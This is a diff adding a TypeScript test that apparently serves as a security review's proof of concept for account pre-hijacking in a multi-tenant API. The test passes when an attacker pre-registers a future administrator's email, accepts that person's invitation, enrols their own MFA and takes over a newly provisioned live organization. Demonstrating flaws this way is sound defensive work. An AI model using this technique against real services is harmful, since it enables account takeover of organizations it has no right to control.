@@ -1,0 +1,78 @@
+/**
+ * Second steward review — HTTP proof of N-1 (account pre-hijacking). PASSES when the attack WORKS.
+ * A trial administrator pre-creates the future GM's global identity with a password of their choice; Monoclay later
+ * provisions the hotel's LIVE organization with that email as first administrator; the attacker accepts in-app.
+ */
+import { newId } from '@portico/kernel';
+import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { provisionOrganization } from '../src';
+import { type ApiHarness, enrolMfa, signedInOrg, startApi } from './helpers';
+
+let h: ApiHarness;
+beforeAll(async () => {
+  h = await startApi();
+});
+afterAll(async () => h?.close());
+
+describe('REVIEW-2 PoC N-1 over HTTP: the first administrator of a new live organization is captured', () => {
+  it('pre-registered email + in-app acceptance = sole org_admin of the live hotel', async () => {
+    const gmEmail = `gm-${newId().slice(-8)}@new-hotel.mv`;
+    const ATTACKER_PW = 'attacker-chosen-password';
+
+    // Attacker: administrator of any organization (here a sandbox-like test org).
+    const attacker = await signedInOrg(h, 'Attacker org');
+    const pre = await h.app.inject({
+      method: 'POST',
+      url: '/v1/users',
+      headers: { ...attacker.auth, 'idempotency-key': newId() },
+      payload: { email: gmEmail, displayName: 'GM', initialPassword: ATTACKER_PW, roles: [] },
+    });
+    expect(pre.statusCode).toBe(201);
+    expect(pre.json().status).toBe('active');
+
+    // Monoclay provisions the hotel's live organization with the GM as first administrator (operator / CLI path).
+    const { tenantId: hotel } = await provisionOrganization(h.t.db, {
+      name: 'New Hotel',
+      slug: `hotel-${newId().slice(-12)}`,
+      environment: 'live',
+      planCode: 'enterprise',
+      admin: { email: gmEmail, displayName: 'General manager' },
+    });
+
+    // The attacker signs in (to their own org) as "the GM", sees the invitation and accepts it.
+    const login = await h.app.inject({
+      method: 'POST',
+      url: '/v1/auth/login',
+      payload: { email: gmEmail, password: ATTACKER_PW },
+    });
+    expect(login.json().status).toBe('signed_in');
+    const auth = { authorization: `Bearer ${login.json().token}` };
+    const inv = await h.app.inject({ method: 'GET', url: '/v1/me/invitations', headers: auth });
+    expect(inv.json().items.map((i: { organizationId: string }) => i.organizationId)).toContain(hotel);
+    const acc = await h.app.inject({
+      method: 'POST',
+      url: `/v1/me/invitations/${hotel}/accept`,
+      headers: auth,
+    });
+    expect(acc.statusCode).toBe(200);
+
+    // Sign in to the hotel, enrol the attacker's authenticator, administer the hotel.
+    const live = await h.app.inject({
+      method: 'POST',
+      url: '/v1/auth/login',
+      payload: { email: gmEmail, password: ATTACKER_PW, organizationId: hotel },
+    });
+    expect(live.json().status).toBe('signed_in');
+    const liveAuth = { authorization: `Bearer ${live.json().token}` };
+    await enrolMfa(h.app, liveAuth, ATTACKER_PW);
+    const users = await h.app.inject({ method: 'GET', url: '/v1/users', headers: liveAuth });
+    expect(users.statusCode).toBe(200);
+    const roles = await h.app.inject({
+      method: 'POST',
+      url: '/v1/roles',
+      headers: { ...liveAuth, 'idempotency-key': newId() },
+      payload: { key: 'attacker_probe', name: 'Probe', permissions: ['platform.property.read'] },
+    });
+    expect([200, 201]).toContain(roles.statusCode);
+  }, 60_000);
+});
